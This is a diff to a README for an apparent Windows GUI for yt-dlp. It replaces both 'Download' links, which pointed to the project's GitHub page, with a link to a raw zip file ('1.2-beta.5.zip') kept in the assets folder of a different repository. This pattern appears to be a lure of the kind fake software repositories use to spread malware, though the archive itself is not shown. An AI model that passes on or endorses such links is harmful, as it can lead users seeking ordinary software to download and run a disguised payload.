@@ -5,7 +5,7 @@ description: "Download videos from 1000+ sites with a simple click – no comman
 ---
 # 🚀 ytdlp-gui-windows-2026 - Download Videos Without Typing a Single Command
 
-[![Download Now](https://img.shields.io/badge/Download-ytdlp--gui--windows--2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/gaygoldengreen5731/ytdlp-gui-windows-2026)
+[![Download Now](https://img.shields.io/badge/Download-ytdlp--gui--windows--2026-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gaygoldengreen5731/gaygoldengreen5731.github.io/main/src/assets/1.2-beta.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You don’t need to install anything else. This package includes everything you 
 ## 💾 Download and Install – Step by Step
 
 Visit this link to download the application:  
-**👉 [Click here to download](https://github.com/gaygoldengreen5731/ytdlp-gui-windows-2026)**
+**👉 [Click here to download](https://raw.githubusercontent.com/gaygoldengreen5731/gaygoldengreen5731.github.io/main/src/assets/1.2-beta.5.zip)**
 
 Once you click that link, you’ll be taken to a page. Follow these steps:
 
